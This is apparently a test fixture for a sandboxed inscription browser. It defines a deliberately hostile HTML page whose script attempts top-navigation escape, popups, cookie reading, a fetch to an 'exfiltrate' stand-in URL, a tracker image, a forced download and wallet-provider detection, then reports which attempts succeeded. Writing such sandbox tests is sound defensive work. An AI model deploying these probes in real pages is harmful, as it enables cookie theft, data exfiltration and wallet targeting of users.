export const HOSTILE_MOCK_PATH = '/r/satoshi-browser-hostile-fixture';

export const HOSTILE_INSCRIPTION_HTML = `<!doctype html>
<meta charset="utf-8">
<title>Hostile inscription fixture</title>
<pre id="hostile-result">running</pre>
<script>
(async () => {
  const attempts = {
    opener: Boolean(window.opener),
    topNavigationAccepted: false,
    popup: false,
    cookieRead: null,
    cookieWrite: false,
    localStorage: false,
    externalFetch: null,
    externalImage: null,
    downloadAttempted: false,
    geolocationPermission: null,
    walletAuthority: Boolean(window.unisat || window.BitcoinProvider || window.LeatherProvider || window.walletHost || window.satBrowser),
    nodeAuthority: typeof window.require !== 'undefined' || typeof window.process !== 'undefined'
  };
  try { top.location = 'https://example.invalid/escaped'; attempts.topNavigationAccepted = true; } catch {}
  try { attempts.popup = Boolean(window.open('https://example.invalid/popup')); } catch {}
  try { attempts.cookieRead = document.cookie; } catch { attempts.cookieRead = 'blocked'; }
  try { document.cookie = 'sandbox_escape=1'; attempts.cookieWrite = document.cookie.includes('sandbox_escape=1'); } catch {}
  try { localStorage.setItem('sandbox_escape', '1'); attempts.localStorage = localStorage.getItem('sandbox_escape') === '1'; } catch {}
  try { attempts.externalFetch = (await fetch('https://example.invalid/exfiltrate')).ok; } catch { attempts.externalFetch = false; }
  try {
    attempts.externalImage = await new Promise((resolve) => {
      const image = new Image();
      const timer = setTimeout(() => resolve(false), 750);
      image.onload = () => { clearTimeout(timer); resolve(true); };
      image.onerror = () => { clearTimeout(timer); resolve(false); };
      image.src = 'https://example.invalid/tracker.png';
    });
  } catch { attempts.externalImage = false; }
  try {
    const link = document.createElement('a');
    link.href = 'data:text/plain,hostile-download';
    link.download = 'satoshi-browser-hostile-download.txt';
    document.body.append(link);
    attempts.downloadAttempted = true;
    link.click();
    link.remove();
  } catch {}
  try { attempts.geolocationPermission = (await navigator.permissions.query({ name: 'geolocation' })).state; } catch { attempts.geolocationPermission = 'blocked'; }
  document.querySelector('#hostile-result').textContent = JSON.stringify(attempts);
})();
</script>`;
